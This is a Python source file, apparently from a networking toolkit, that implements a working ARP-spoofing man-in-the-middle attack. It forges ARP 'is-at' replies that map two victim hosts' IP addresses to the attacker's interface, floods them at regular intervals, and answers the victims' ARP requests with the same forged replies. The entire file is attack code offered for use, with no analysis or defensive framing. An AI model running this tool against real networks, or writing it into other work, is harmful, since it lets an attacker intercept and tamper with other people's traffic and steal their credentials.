from agave.frames import ethernet, arp
from ipaddress import IPv4Address
import select, socket, time
from .utils import _create_socket, _parse, SOCKET_MAX_READ
from .resolve import resolve
from agave.modules.nic.interfaces import NetworkInterface
from agave.frames.ethernet import MACAddress
from typing import Tuple


HOST = Tuple[MACAddress, IPv4Address]


def main(argv):
	try:
		interface = NetworkInterface.get_by_name(argv[0])
		alice_ip = IPv4Address(argv[1])
		alice_mac = resolve(interface, alice_ip)
		print("Resolved {} to {}".format(alice_ip, alice_mac))
		bob_ip = IPv4Address(argv[2])
		bob_mac = resolve(interface, bob_ip)
		print("Resolved {} to {}".format(bob_ip, bob_mac))
		print("Running ...")
		MITM(
			interface,
			(alice_mac, alice_ip),
			(bob_mac, bob_ip)
		).run()
	except KeyboardInterrupt as e:
		pass


class MITM:

	def __init__(
		self,
		interface: NetworkInterface,
		alice: HOST,
		bob: HOST,
		flood_interval: float = 1
	):
		self.rawsocket = _create_socket()
		self.message_for_bob = arp.ARP.is_at(
			interface.mac.address, alice[1],
			bob[0].address, bob[1]
		)
		self.message_for_alice = arp.ARP.is_at(
			interface.mac.address, bob[1],
			alice[0].address, alice[1]
		)
		self.gratuitous_timeout = flood_interval
		self.last_gratuitous = time.time()
		self.interface = (interface.name, 1)
		self.bob_ip = bob[1].packed
		self.alice_ip = alice[1].packed

	def send_gratuitous(self):
		self.rawsocket.sendto(self.message_for_bob, self.interface)
		self.rawsocket.sendto(self.message_for_alice, self.interface)
		self.last_gratuitous = time.time()

	def should_send_gratuitous(self):
		return self.gratuitous_timeout < (time.time() - self.last_gratuitous)

	def process(self, data: bytes):
		eth_frame, arp_frame = _parse(data)
		if arp_frame.operation == arp.OPERATION_REQUEST:
			# if alice requests bob's mac
			if (arp_frame.target_protocol_address == self.bob_ip and
					arp_frame.sender_protocol_address == self.alice_ip):
				self.rawsocket.sendto(self.message_for_alice, self.interface)
			# if bob requests alice's mac
			elif (arp_frame.target_protocol_address == self.alice_ip and
					arp_frame.sender_protocol_address == self.bob_ip):
				self.rawsocket.sendto(self.message_for_bob, self.interface)

	def run(self):
		self.send_gratuitous()
		while True:
			rl, wl, xl = select.select([self.rawsocket], [], [], self.gratuitous_timeout)
			if rl != []:
				self.process(self.rawsocket.recv(SOCKET_MAX_READ))
			if self.should_send_gratuitous():
				self.send_gratuitous()
